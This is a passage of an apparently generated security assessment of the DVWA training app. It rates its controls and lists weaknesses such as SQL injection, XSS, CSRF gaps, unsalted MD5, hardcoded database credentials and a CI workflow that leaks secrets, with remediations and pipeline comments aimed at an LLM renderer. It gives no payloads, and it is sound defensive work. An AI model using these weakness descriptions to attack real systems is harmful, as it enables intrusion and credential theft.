**Assessment:** Sessions are server-side, and the only catalogued control is the anti-CSRF token on the login form. Session fixation (🟡 [F-044](#f-044)) and continued use of withdrawn rights (🟡 [F-100](#f-100)) show that session lifecycle handling is weak.

**Findings in this category without a control:**

- 🟡 [F-044](#f-044) — Session fixation
- 🟡 [F-100](#f-100) — User keeps using a withdrawn right

<a id="anti-csrf-token-on-login"></a>
#### 6.3.1 Anti-CSRF token on login

**Status:** 🟢 Adequate - the login form token is per-session and regenerated on each render, though the validation code was not inspected.

The login form embeds a per-session `user_token`. On POST, `checkToken` compares the submitted value with the session token, and a fresh token is generated whenever the form is rendered.

The diagram shows the token round trip on the login form:
```mermaid
sequenceDiagram
    autonumber
    actor User
    participant Web as Login Page
    User->>Web: Request login form
    Web-->>User: Form with fresh user_token, token stored in session
    User->>Web: POST credentials and user_token
    Web->>Web: checkToken compares with session token
    Web-->>User: Continue login on match
```

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): The login form POST validates a per-session user_token via checkToken against the session token. The token is regenerated on each form render. The checkToken implementation was not inspected. -->
The token check itself is sound in design, but its implementation was not inspected, and the protection stops at the login form:

- Other state-changing requests carry no token (🟠 [F-001](#f-001)).
- A weaker CSRF check at lower difficulty levels can be bypassed (🟠 [F-025](#f-025)).
- Session fixation is possible, so the session identity is not renewed safely (🟡 [F-044](#f-044)).



**Relevant findings**

- None linked to this control; see the other findings of this category.

### 6.4 Authorization Controls

<a id="ctrl-authorization-controls"></a>


**Systemic weaknesses:** [W-004](#w-004), [W-005](#w-005), [W-011](#w-011), [W-012](#w-012)
**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the section's default mechanism — LLM must not re-author it. -->
**Controls covered:**

- [6.4.1 Route and Object Authorization](#641-route-and-object-authorization)

**Implemented controls:** Admin-role gating on user-management endpoints, a static-token check on the object endpoint, a CAPTCHA state check.

**Assessment:** Authorization decisions rely on client-controlled inputs and incomplete gates. Admin-only user endpoints are not reliably gated (🟠 [F-039](#f-039)), and object access hinges on a static public token (🟡 [F-081](#f-081)). The unauthenticated user API permits mass assignment (🟡 [F-082](#f-082)), and CAPTCHA state comes from a client field (🟡 [F-050](#f-050)).

<a id="route-and-object-authorization"></a>
#### 6.4.1 Route and Object Authorization

**Status:** 🟠 Weak - checks exist but trust client-supplied values and leave user-management endpoints exposed.

This control decides who may change user data and reach protected functions. Admin user-management endpoints, the user API, and the object lookup page each apply their own access check.

**Security assessment**

Access checks depend on values the caller controls. Admin-only user endpoints are not reliably restricted (🟠 [F-039](#f-039)). The IDOR demo accepts a static, publicly known token (🟡 [F-081](#f-081)). The unauthenticated user API through `UserController.php` accepts attacker-chosen fields, enabling mass assignment (🟡 [F-082](#f-082)). CAPTCHA progress is read from a client field (🟡 [F-050](#f-050)).

**Relevant findings**

- 🟠 [F-039](#f-039) — Admin-only user endpoints gated
- 🟡 [F-050](#f-050) — CAPTCHA state trusted from client-supplied field
- 🟡 [F-081](#f-081) — IDOR guarded by static public token
- 🟡 [F-082](#f-082) — Unauthenticated user API allows mass assignment

### 6.5 Query Construction and Data Access Controls

<a id="ctrl-query-construction-and-data-access-controls"></a>


**Systemic weaknesses:** [W-002](#w-002)
**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.5.1 Login SQL query construction](#651-login-sql-query-construction)

**Implemented controls:** Login SQL query construction.

**Assessment:** Queries are built as strings and protected only by escaping. Injection appears across login, update, and many vulnerability modules, including 🔴 [F-005](#f-005) — SQL injection in user detail update endpoint, 🟠 [F-017](#f-017) — SQL injection in brute-force login query, 🟠 [F-018](#f-018) — Second-order SQL injection, and 🟠 [F-020](#f-020) — SQL injection in unquoted numeric context despite escaping, the last in an unquoted numeric context where escaping does not help.

**Findings in this category without a control:**

- 🔴 [F-005](#f-005) — SQL injection in user detail update endpoint
- 🟠 [F-014](#f-014) — SQL injection
- 🟠 [F-015](#f-015) — SQL injection
- 🟠 [F-016](#f-016) — SQL injection
- 🟠 [F-017](#f-017) — SQL injection in brute-force login query
- 🟠 [F-018](#f-018) — Second-order SQL injection
- 🟠 [F-019](#f-019) — SQL injection
- 🟠 [F-020](#f-020) — SQL injection in unquoted numeric context despite escaping
- 🟠 [F-021](#f-021) — Blind SQL injection
- 🟠 [F-022](#f-022) — Blind SQL injection
- 🟠 [F-023](#f-023) — Blind SQL injection

<a id="login-sql-query-construction"></a>
#### 6.5.1 Login SQL query construction

**Status:** 🟠 Weak - login input is escaped, not parameterized, so the query remains injectable.

The login handler passes input through `mysqli_real_escape_string` and interpolates the result into a SQL string. No prepared statement is used.

The diagram shows the intended login query path:
```mermaid
sequenceDiagram
    autonumber
    actor User
    participant Web as Login Handler
    participant DB as MariaDB
    User->>Web: Submit credentials
    Web->>Web: Escape input with mysqli_real_escape_string
    Web->>DB: Run string-built SELECT
    DB-->>Web: Matching row or empty result
```

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Login input is escaped with mysqli_real_escape_string and interpolated into a string-built SQL query rather than a prepared statement. Escaping is the only defense. It is weaker than parameterization. -->
Escaping is the only defense here, and it is weaker than parameterization. Related findings show where it fails:

- The brute-force login query is injectable (🟠 [F-017](#f-017)).
- A numeric context stays injectable even with escaping (🟠 [F-020](#f-020)).
- Stored values are re-used in later queries, giving second-order injection (🟠 [F-018](#f-018)).
- Blind injection variants exist at every difficulty level (🟠 [F-021](#f-021), 🟠 [F-022](#f-022), 🟠 [F-023](#f-023)).



**Relevant findings**

- None linked to this control; see the other findings of this category.

### 6.6 Input Boundary Validation Controls

<a id="ctrl-input-boundary-validation-controls"></a>

**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.6.1 Validation Approach](#661-validation-approach)

**Implemented controls:** Escaping on SQL input, literal script-tag stripping, redirect allow and deny checks, MIME type check on uploads.

**Assessment:** Validation is pattern-based and easy to bypass: the redirect checks (🟡 [F-047](#f-047), 🟡 [F-049](#f-049)), the upload MIME check (🟠 [F-036](#f-036)), and the include parameter (🟠 [F-034](#f-034)) each accept crafted input. No catalogued shared validation layer exists.

<a id="validation-approach"></a>
#### 6.6.1 Validation Approach

**Status:** 🟠 Weak - no shared validation layer is catalogued, and the per-module checks seen in findings are bypassable.

Each vulnerability module validates its own inputs with local checks such as redirect substring tests, script-tag stripping, and a MIME type test on uploads.

**Security assessment**

Local checks trust client input or match narrow patterns:

- Redirect targets are checked by substring or scheme denylist, both bypassable (🟡 [F-047](#f-047), 🟡 [F-049](#f-049)).
- Upload type relies on the client-supplied MIME type (🟠 [F-036](#f-036)).
- The page parameter reaches `include` unchecked at lower levels (🟠 [F-032](#f-032)).

**Relevant findings**

- None.

### 6.7 Output Encoding and Rendering Controls


**Systemic weaknesses:** [W-006](#w-006)
**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the section's default mechanism — LLM must not re-author it. -->
**Controls covered:**

- [6.7.1 Output Encoding and Client-Side Rendering](#671-output-encoding-and-client-side-rendering)

**Implemented controls:** `htmlspecialchars` encoding at the impossible difficulty level, literal script-tag stripping at medium and high levels.

**Assessment:** Output encoding is applied only at the strictest level. Elsewhere, request values are written into HTML and inline scripts, producing stored (🟠 [F-011](#f-011), 🟠 [F-012](#f-012)), DOM-based (🟠 [F-013](#f-013)), and reflected XSS (🟡 [F-059](#f-059), 🟡 [F-064](#f-064)). Blacklist filters are bypassable.

**Findings in this category without a control:**

- 🟡 [F-059](#f-059) — Reflected XSS
- 🟡 [F-060](#f-060) — Reflected script injection bypassing permissive CSP
- 🟡 [F-061](#f-061) — Unvalidated JSONP callback reflected into script response
- 🟡 [F-062](#f-062) — Reflected XSS of username in test credentials page
- 🟡 [F-063](#f-063) — Reflected XSS
- 🟡 [F-064](#f-064) — Reflected cross-site scripting
- 🟡 [F-065](#f-065) — Reflected name parameter rendered without HTML encoding
- 🟡 [F-066](#f-066) — Stored XSS payloads accepted into guestbook entries

<a id="output-encoding-and-client-side-rendering"></a>
#### 6.7.1 Output Encoding and Client-Side Rendering

**Status:** 🟠 Weak - encoding exists only at the strictest level, while other levels render raw input.

Pages show user-supplied names, messages, and URL values back to the visitor. Most modules write these values into the page directly, and only the strictest level encodes them.

**Security assessment**

Stored, reflected, and DOM-based XSS all appear. Guestbook and name fields store payloads (🟠 [F-011](#f-011), 🟠 [F-012](#f-012)). Client script writes the URL language parameter into the page with `document.write` (🟠 [F-013](#f-013)). The username on the login page is echoed raw (🟡 [F-058](#f-058)), and the request URI lands in an inline script string (🟡 [F-057](#f-057)). Filters strip only a literal script tag or one pattern, so variants pass.

**Relevant findings**

- 🟠 [F-011](#f-011) — Stored XSS
- 🟠 [F-012](#f-012) — Stored XSS
- 🟠 [F-013](#f-013) — DOM-based XSS from URL default parameter written
- 🟡 [F-057](#f-057) — Request URI reflected unescaped into inline script string
- 🟡 [F-058](#f-058) — Reflected XSS of username on brute-force login

### 6.8 Browser and Cross-Origin Controls


**Systemic weaknesses:** [W-005](#w-005)
**Verdict:** 🟠 Weak

<!-- The line below is mechanically derived from the section's default mechanism — LLM must not re-author it. -->
**Controls covered:**

- [6.8.1 Browser Security Headers and CORS/CSRF Posture](#681-browser-security-headers-and-corscsrf-posture)

**Implemented controls:** Per-session CSRF token on the login form, a `Content-Security-Policy` header (permissive, see 🟡 [F-060](#f-060)).

**Assessment:** Browser-side protection is partial. State-changing requests mostly lack an anti-CSRF token (🟠 [F-001](#f-001)), the CSRF check at lower levels is bypassable (🟠 [F-025](#f-025)), and the CSP is permissive enough for script injection (🟡 [F-060](#f-060)).

<a id="browser-security-headers-and-corscsrf-posture"></a>
#### 6.8.1 Browser Security Headers and CORS/CSRF Posture

**Status:** 🟠 Weak - CSRF protection covers the login form only, and the CSP does not stop script injection.

The login form carries a hidden token that stops other sites from submitting it on a user's behalf. Pages also send a `Content-Security-Policy` header.

**Security assessment**

Token coverage is thin and the header is lenient:

- State changes such as password change run without any anti-CSRF token (🟠 [F-001](#f-001)).
- The medium-level token check can be bypassed (🟠 [F-025](#f-025)).
- The permissive CSP lets reflected script through (🟡 [F-060](#f-060)).

**Relevant findings**

- 🟠 [F-001](#f-001) — Missing Anti-CSRF Token on State Changes
- 🟠 [F-025](#f-025) — CSRF check bypass

### 6.9 Cryptography Secrets and Data Protection


**Systemic weaknesses:** [W-007](#w-007), [W-008](#w-008)
**Verdict:** 🔴 Unsafe

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.9.1 Database credential management](#691-database-credential-management)
- [6.9.2 Database data persistence and protection at rest](#692-database-data-persistence-and-protection-at-rest)
- [6.9.3 Password Hashing and Credential Storage](#693-password-hashing-and-credential-storage)
- [6.9.4 Database credential and secret management](#694-database-credential-and-secret-management)

**Implemented controls:** Database credential management, Database data persistence and protection at rest, Password hashing, Database credential and secret management.

**Assessment:** Secrets and hashes are present but defeated. Passwords use unsalted `MD5` (🟠 [F-002](#f-002) (Broken `MD5` hashing used for stored passwords without salt or strength policy), 🟠 [F-030](#f-030) (Unsalted `MD5` password hashing)), database credentials are committed in plaintext (🟡 [F-040](#f-040)), and symmetric keys are hardcoded (🟠 [F-029](#f-029), 🟡 [F-043](#f-043)). Home-built XOR encryption (🟡 [F-069](#f-069)) adds to the gaps.

**Findings in this category without a control:**

- 🟠 [F-029](#f-029) — Hardcoded symmetric encryption keys in source
- 🟡 [F-040](#f-040) — Hardcoded weak MariaDB root and application credentials
- 🟡 [F-043](#f-043) — Hardcoded encryption key and static secret allow API token
- 🟡 [F-051](#f-051) — Hardcoded client secret and user password in API login
- 🟡 [F-052](#f-052) — Static access token accepted from the URL query string
- 🟡 [F-069](#f-069) — Repeating-key XOR used as message encryption

<a id="database-credential-management"></a>
#### 6.9.1 Database credential management

**Status:** 🔴 Unsafe - database passwords are weak, predictable and committed in plaintext in `compose.yml`.

MariaDB root and application passwords are set as plain environment values in `compose.yml` and passed to the database container.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): MariaDB root and application passwords are hardcoded in plaintext in compose.yml environment (root password 'dvwa'; user password is a literal 8-char value). Credentials are weak, predictable and committed to source. -->
Credentials live in source control and cannot be rotated without editing it:

- The root password is `dvwa` and the user password is a short literal (🟡 [F-040](#f-040)).
- The same values are flagged as hardcoded in compose (🟠 [F-027](#f-027)).
- A config backup with these credentials is copied into the web root (🟡 [F-071](#f-071)).

**Relevant findings**

- None linked to this control; see the other findings of this category.

<a id="database-data-persistence-and-protection-at-rest"></a>
#### 6.9.2 Database data persistence and protection at rest

**Status:** 🟠 Weak - data sits on a named volume with no visible encryption or backup.

Database files persist in a named Docker volume attached to the MariaDB container.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Data persists in a named volume with no encryption at rest or backup configuration visible in this file. Recovery and backup controls were not found here. -->
Persistence is configured, protection is not visible in this file:

- No encryption at rest is configured.
- No backup or recovery configuration was found.
- Host-level volume protection was not assessed.

**Relevant findings**

- None linked to this control; see the other findings of this category.

<a id="password-hashing"></a><a id="password-hashing-and-credential-storage"></a>
#### 6.9.3 Password Hashing and Credential Storage

**Status:** 🔴 Unsafe - passwords are hashed with unsalted `MD5`, which is cryptographically defeated.

Passwords are hashed with `MD5` before storage in the `users` table. The setup routine seeds accounts with well-known weak passwords hashed the same way.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Passwords are hashed with unsalted MD5. The setup seeds the users table with well-known weak passwords hashed with MD5. This is a relied-upon mechanism that is cryptographically defeated. -->
The hashing scheme is the control that fails, and the seed data compounds it:

- `MD5` has no salt or work factor, so a dumped table is cracked quickly (🟠 [F-002](#f-002) — Broken MD5 hashing used for stored passwords without salt or strength policy (Broken `MD5` hashing used for stored passwords without salt or strength policy), 🟠 [F-030](#f-030) — Unsalted MD5 password hashing (Unsalted `MD5` password hashing)).
- Seeded accounts use well-known passwords (🟠 [F-009](#f-009)).
- A legacy user API returns password hashes to callers (🟡 [F-068](#f-068)).

**Relevant findings**

- None linked to this control; see the other findings of this category.

<a id="database-credential-and-secret-management"></a>
#### 6.9.4 Database credential and secret management

**Status:** 🟠 Weak - credentials sit in plain compose environment values rather than a secrets store.

`compose.yml` supplies the MariaDB root and application passwords as plain environment values. No secrets file or external store is referenced.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): compose.yml hardcodes the MariaDB root password and the application DB user password in plain environment values. This is probably intentional for a training app, but it is not a secrets-management control. -->
This is probably intentional for a training app, but it is not a secrets-management control:

- Passwords are committed with the repository (🟠 [F-027](#f-027), 🟡 [F-040](#f-040)).
- The application also embeds client secrets and keys in source (🟡 [F-051](#f-051), 🟡 [F-043](#f-043)).
- Rotation requires a code change and redeploy.

**Relevant findings**

- None linked to this control; see the other findings of this category.

<a id="recaptcha-outbound-verification"></a>
#### 6.10.1 reCAPTCHA outbound verification

**Status:** 🟡 Partial - the call targets a fixed HTTPS URL, but failures are not handled.

CAPTCHA verification sends the secret and the user response to a fixed Google HTTPS URL using `file_get_contents`.

The diagram shows the intended `reCAPTCHA` verification call:
```mermaid
sequenceDiagram
    autonumber
    participant Web as CAPTCHA Handler
    participant G as Google reCAPTCHA
    Web->>G: POST secret and user response to fixed HTTPS URL
    G-->>Web: Verification result
    Web->>Web: Accept or reject the step
```

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): The outbound call goes to a fixed HTTPS Google URL with the secret in the POST body. A failure of the HTTP call is not handled, because file_get_contents warnings do not raise an Exception. Result handling on failure was not fully inspected. -->
The outbound target is fixed, but the surrounding CAPTCHA logic is weak:

- A failed HTTP call raises only a warning, not an exception, so failure handling is unverified.
- Step 2 can be submitted directly, skipping the check (🟡 [F-053](#f-053)).
- CAPTCHA state is trusted from a client field (🟡 [F-050](#f-050)).
- A debug backdoor remains in the code (🟡 [F-045](#f-045)).



**Relevant findings**

- None linked to this control; see the other findings of this category.

- 🟡 [F-056](#f-056) — Third-party GitHub Actions pinned to mutable tags instead of commit SHAs

<a id="database-network-exposure-and-isolation"></a>
#### 6.11.1 Database network exposure and isolation

**Status:** 🟡 Partial - the database has no published host port, but there is no TLS or per-client restriction.

The `db` service publishes no host ports and joins only the dedicated `dvwa` network, which the web service shares.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): The db service publishes no host ports and is attached only to the dedicated dvwa network, limiting reachability to containers on that network. No TLS or per-client restriction is configured, and the web service shares the network. Upstream firewall or host controls were not assessed. -->
Reach is limited to that network, with open questions beyond it:

- No TLS is configured for database connections.
- The web container shares the network and can reach the database freely.
- Upstream firewall and host controls were not assessed.

**Status:** 🟠 Weak - the database image uses a floating major tag with no digest.

The database service pulls `mariadb:10`, a major-version tag.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Image uses the floating major tag mariadb:10 with no digest pinning, so builds are not reproducible and image provenance is not verified in this configuration. -->

- Builds are not reproducible.

<a id="ci-action-and-dependency-pinning"></a>
#### 6.11.3 CI action and dependency pinning

**Status:** 🟠 Weak - actions and base images use mutable tags rather than commit SHAs or digests.

Workflows reference third-party actions by version tag, and the `Dockerfile` builds from `php:8-apache` and `composer:latest`.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Actions are pinned to version tags (mutable), not commit SHAs; Dockerfile uses composer:latest and a floating php:8-apache base. pytest workflow installs unpinned pytest. Supply-chain tampering is possible via tag/image moves. -->
A moved tag or image changes what CI runs:

- Third-party actions are pinned to mutable tags (🟡 [F-056](#f-056)).
- Container images float without digests (🟡 [F-055](#f-055)).
- The pytest workflow installs an unpinned `pytest`.

<a id="ci-secrets-handling"></a>
#### 6.11.4 CI secrets handling

**Status:** 🔴 Unsafe - a workflow prints every repository secret base64-encoded, defeating log masking.

`vulnerable.yml` runs on push to master and exports the secrets context to the job environment.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Workflow exports all secrets via toJSON(secrets) and prints them base64-encoded, defeating GitHub log masking and leaking every repository secret on each push to master (appears intentionally vulnerable demo). -->
The leak is deliberate-looking but real in effect:

- `toJSON(secrets)` is encoded and printed, so masking does not apply (🟠 [F-026](#f-026)).
- Every push to master repeats the exposure.
- Who can read the log depends on repository visibility, which source does not show.

- None linked to this control; see the other findings of this category.

<!-- Model assessment (facts the narrative must not contradict): CodeQL runs on push, PR and weekly schedule for JavaScript and Python; ShiftLeft scan uploads SARIF. No PHP analysis configured and no dependency scanning observed. -->

<a id="container-and-compose-deployment-configuration"></a>
#### 6.11.7 Container and compose deployment configuration

**Status:** 🟠 Weak - the port is localhost-bound, but credentials are weak and the container is not hardened.

Compose publishes the web port on localhost only. The image runs Apache with composer and git installed.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): Port is bound to localhost only, which limits exposure. Database uses hardcoded weak credentials (root password dvwa) in compose, and the container runs Apache with composer and git installed with no non-root user or hardening. -->
Binding to localhost limits exposure, and the container itself is wide open:

- The container runs as root (🟡 [F-074](#f-074)).
- Database credentials are weak and hardcoded (🟠 [F-027](#f-027)).
- No non-root user or hardening is configured.

**Relevant findings**

- None linked to this control; see the other findings of this category.

<a id="network-exposure-and-deployment-configuration"></a>
#### 6.11.8 Network exposure and deployment configuration

**Status:** 🟡 Partial - web and database are not publicly exposed, but neither uses TLS.

The web port is bound to `127.0.0.1`, and the database sits on a private compose network with no published port.

**Security assessment**

<!-- Model assessment (facts the narrative must not contradict): The web port is bound to 127.0.0.1 only. The DB is on a private compose network with no published port. This limits exposure, but the database credentials are weak and no TLS is configured for the web or DB transport. -->
Exposure is narrow, transport and credentials are not:

- No TLS is configured for web or database traffic.
- Database credentials are weak and committed (🟠 [F-027](#f-027), 🟡 [F-040](#f-040)).
- Raw database errors reach the client (🟡 [F-003](#f-003)).

**Relevant findings**

- None linked to this control; see the other findings of this category.

### 6.12 Real-time and Not Applicable Controls

<!-- §6.12 LOCKED — mechanically derived: no routed finding and no real-time, LLM, GraphQL, or gRPC component in the model. Renderer must not rewrite the line below. -->
_Not applicable - no finding routed to this category, and the architecture model contains no real-time / WebSocket, AI/LLM, GraphQL, or gRPC component. Controls catalogued elsewhere (container hardening, dependency determinism) are covered in their primary [§6](#6-security-architecture) sections._

### 6.13 Defense-in-Depth Summary

<!-- §6.13 FORMAT — NEVER a table, at most 120 words, no file:line. Two short bullet lists: **What holds** (the individual positive controls that exist, strongest first, e.g. distroless runtime image, RS256 algorithm choice) and **Repair first** (the control-boundary repairs that would restore layered defense, each with its mitigation link [M-NNN](#m-nnn)). Do NOT emit a Markdown table — `| header |` lines under §6.13 are a contract violation. -->

**What holds**

- Web port bound to localhost only.
- Database on a private network with no published port.
- Scoped `GITHUB_TOKEN` for image push.
- CodeQL and ShiftLeft scans in CI.
- Per-session CSRF token on login.

**Repair first**

- Replace string-built SQL with prepared statements.
- Replace unsalted `MD5` with a salted password hash.
- Remove the workflow that prints all secrets.
- Move credentials out of `compose.yml`.
- Add server-side authorization to user endpoints.

## 7. Weakness Register

Each weakness names the missing, home-grown, or misused control, the findings that evidence it, the components it spans, and its remediation. A weakness may also rest on observed unsafe practice or an absent architectural control with no confirmed exploit - only confirmed findings carry a CVSS score.

<a id="w-001"></a>
### W-001 — Application data builds operating-system commands

🔴 Critical · implementation weakness · confirmed · 1 finding

A command line is assembled from application values and handed to a shell. Shell syntax in those values runs as further commands with the privileges of the service.

**Confirmed findings:**

- 🔴 [F-004](#f-004) — OS command injection in health connectivity check and ping feature

**Practice sites:**

- `.github/workflows/docker-image.yml:33`

**Affected components:** [C-02](#c-02), [C-03](#c-03)

**Remediation:**

- **Structural** — call a fixed executable with an argument list and no shell, and accept only allowlisted argument values from callers
- **Tactical** — ● [M-013](#m-013) — Validate target host and use escapeshellarg

<a id="w-002"></a>
### W-002 — Database access relies on concatenated queries

🔴 Critical · implementation weakness · confirmed · 11 findings

Database queries are assembled from application values instead of passing those values through an enforced parameterised data-access path. This leaves every call site responsible for preserving query structure.

**Architectural anti-pattern - Raw SQL string interpolation.** Request values are concatenated into SQL across many pages, so parameter binding is not a shared boundary. Each page must be fixed or moved onto one data-access layer.

**Confirmed findings:**

- 🔴 [F-005](#f-005) — SQL injection in user detail update endpoint
- 🟠 [F-017](#f-017) — SQL injection in brute-force login query
- 🟠 [F-018](#f-018) — Second-order SQL injection
- 🟠 [F-019](#f-019) — SQL injection
- 🟠 [F-020](#f-020) — SQL injection in unquoted numeric context despite escaping
- 🟠 [F-021](#f-021) — Blind SQL injection
- 🟠 [F-022](#f-022) — Blind SQL injection
- 🟠 [F-023](#f-023) — Blind SQL injection

**Practice sites:**

- 🟠 [F-014](#f-014) — SQL injection
- 🟠 [F-015](#f-015) — SQL injection
- 🟠 [F-016](#f-016) — SQL injection

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — provide one parameterised repository or query-builder path and prohibit application-value interpolation in database queries
- **Tactical** — ● [M-014](#m-014) — Use prepared statements for user update query, ● [M-024](#m-024) — Use prepared statements for login lookup, ● [M-025](#m-025) — Bind session id via prepared statement, ● [M-026](#m-026) — Use prepared statements with bound integer id, ● [M-027](#m-027) — Bind id as integer parameter in prepared query, ● [M-028](#m-028) — Parameterize query and validate cookie id, ● [M-029](#m-029) — Use parameterized query for blind lookup, ● [M-030](#m-030) — Bind id as integer in prepared statement, ◑ [M-001](#m-001) — Manual review: verify SQL injection via interpolated/concatenated query PHP…, ◕ [M-022](#m-022) — Use prepared statements, ◑ [M-002](#m-002) — Manual review: verify SQL injection via interpolated/concatenated query PHP…, ● [M-023](#m-023) — Bind log values with prepared statements

<a id="w-003"></a>
### W-003 — Input handling lacks enforced boundary validation

🟠 High · design weakness · confirmed · 1 finding

Request handlers do not validate input against one enforced server-side schema or allowlist at the boundary - validation is either absent on the vulnerable parameters or limited to rejecting selected bad patterns (a blacklist). New encodings and unanticipated input forms can therefore reach downstream parsers or interpreters.

**Confirmed findings:**

- 🟠 [F-028](#f-028) — Path traversal in source viewer discloses

**Practice sites:**

- `vulnerabilities/view_source_all.php:14`

**Architecture evidence:** Schema Validation, Allowlist Validation, Source evidence (`vulnerabilities/javascript/source/low.php:13`), Source evidence (`vulnerabilities/exec/source/high.php:7`), Source evidence (`vulnerabilities/exec/source/high.php:20`), Source evidence (`vulnerabilities/exec/source/medium.php:7`) (+1 more)

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — enforce server-side schemas and domain-specific allowlists before input reaches parsing, persistence, or command construction
- **Tactical** — ◕ [M-034](#m-034) — Constrain file paths to a safe base directory

<a id="w-004"></a>
### W-004 — Authorization is implemented route by route

🟠 High · implementation weakness · confirmed · 2 findings

Authorization depends on per-handler checks instead of a policy boundary that consistently enforces role, ownership, and tenant scope. New routes can bypass protection by omitting a local check.

**Confirmed findings:**

- 🟠 [F-039](#f-039) — Admin-only user endpoints gated

**Practice sites:**

- 🟡 [F-081](#f-081) — IDOR guarded by static public token

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — enforce authorization through a shared server-side policy layer and make ownership and tenant scope mandatory inputs to data access
- **Tactical** — ◕ [M-043](#m-043) — Enforce server-side authorization on every endpoint, ◑ [M-081](#m-081) — Enforce object-level (ownership) authorization

<a id="w-005"></a>
### W-005 — Cookie-authenticated changes lack request authenticity checks

🟠 High · implementation weakness · confirmed · 2 findings

A state-changing operation accepts ambient browser credentials without an enforced check that the authenticated user initiated the request. The affected mutation path lacks a request-authenticity boundary.

**Confirmed findings:**

- 🟠 [F-025](#f-025) — CSRF check bypass

**Practice sites:**

- 🟠 [F-001](#f-001) — Missing Anti-CSRF Token on State Changes

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — enforce framework CSRF protection or validated origin and anti-CSRF tokens on every mutation that accepts ambient browser credentials
- **Tactical** — ◕ [M-032](#m-032) — Replace Referer substring check with anti-CSRF token, ◕ [M-010](#m-010) — Require CSRF token and current password

<a id="w-006"></a>
### W-006 — Frontend rendering lacks enforced output encoding

🟠 High · design weakness · confirmed · 13 findings

Browser rendering paths write HTML or DOM content directly without one enforced contextual-encoding or sanitisation boundary. Safety depends on each individual component using the right API.

**Confirmed findings:**

- 🟠 [F-011](#f-011) — Stored XSS
- 🟠 [F-012](#f-012) — Stored XSS
- 🟠 [F-013](#f-013) — DOM-based XSS from URL default parameter written
- 🟡 [F-058](#f-058) — Reflected XSS of username on brute-force login
- 🟡 [F-059](#f-059) — Reflected XSS
- 🟡 [F-060](#f-060) — Reflected script injection bypassing permissive CSP
- 🟡 [F-062](#f-062) — Reflected XSS of username in test credentials page
- 🟡 [F-063](#f-063) — Reflected XSS
- 🟡 [F-064](#f-064) — Reflected cross-site scripting

**Practice sites:**

- 🟡 [F-057](#f-057) — Request URI reflected unescaped into inline script string
- 🟡 [F-061](#f-061) — Unvalidated JSONP callback reflected into script response
- 🟡 [F-065](#f-065) — Reflected name parameter rendered without HTML encoding
- 🟡 [F-066](#f-066) — Stored XSS payloads accepted into guestbook entries
- `dvwa/includes/dvwaPage.inc.php:406`
- `vulnerabilities/api/source/medium.php:25`
- `vulnerabilities/bac/source/low.php:90`
- `vulnerabilities/captcha/source/low.php:32`
- `vulnerabilities/csp/source/impossible.php:11`
- `vulnerabilities/fi/file3.php:12`

**Architecture evidence:** Template Autoescape, Output Encoding, Content Security Policy, Source evidence (`vulnerabilities/authbypass/authbypass.js:43`)

**Affected components:** [C-03](#c-03)

**Remediation:**

- **Structural** — use framework-safe rendering by default and isolate any required raw HTML behind one reviewed sanitisation and Trusted Types policy
- **Tactical** — ◕ [M-019](#m-019) — Render user fields via textContent and DOM APIs, ◕ [M-020](#m-020) — HTML-escape log fields when rendering access log, ◕ [M-021](#m-021) — Encode output instead of bypassing the framework sanitizer (F-013), ◑ [M-062](#m-062) — HTML-encode username before rendering, ◑ [M-063](#m-063) — Encode or drop PHP_SELF in form action, ◑ [M-064](#m-064) — HTML-encode reflected input and tighten CSP, ◑ [M-066](#m-066) — HTML-encode id before output, ◑ [M-067](#m-067) — HTML-encode reflected name with htmlspecialchars, ◑ [M-061](#m-061) — JSON-encode server values embedded, ◑ [M-065](#m-065) — Validate JSONP callback against an identifier allowlist, ◑ [M-068](#m-068) — HTML-encode the reflected name parameter, ◑ [M-003](#m-003) — Manual review: verify Stored XSS payloads accepted into guestbook entries, ◑ [M-069](#m-069) — Encode guestbook fields on output with htmlspecialchars

<a id="w-007"></a>
### W-007 — Secrets are committed to source instead of a managed store

🟡 Medium · design weakness · confirmed · 6 findings

Cryptographic keys, credentials, and other high-entropy secrets are embedded as literals in source or config rather than resolved at runtime from a managed secret store, so anyone with repository read access obtains reusable signing material and credentials.

**Architectural anti-pattern - Secrets hardcoded in source.** Encryption keys and database passwords live in source and deployment files rather than a managed secret store, so repository access exposes them.

**Confirmed findings:**

- 🟡 [F-052](#f-052) — Static access token accepted from the URL query string

**Practice sites:**

- 🟠 [F-027](#f-027) — Hardcoded MariaDB root and application passwords in compose
- 🟠 [F-029](#f-029) — Hardcoded symmetric encryption keys in source
- 🟡 [F-040](#f-040) — Hardcoded weak MariaDB root and application credentials
- 🟡 [F-043](#f-043) — Hardcoded encryption key and static secret allow API token
- 🟡 [F-051](#f-051) — Hardcoded client secret and user password in API login
- `vulnerabilities/sqli/test.php:4`

**Architecture evidence:** Managed Secret Store, Runtime Secret Injection

**Affected components:** [C-01](#c-01), [C-02](#c-02), [C-03](#c-03)

**Remediation:**

- **Structural** — move every secret to a managed secret store or injected environment configuration, rotate the exposed values, and add secret-scanning to CI
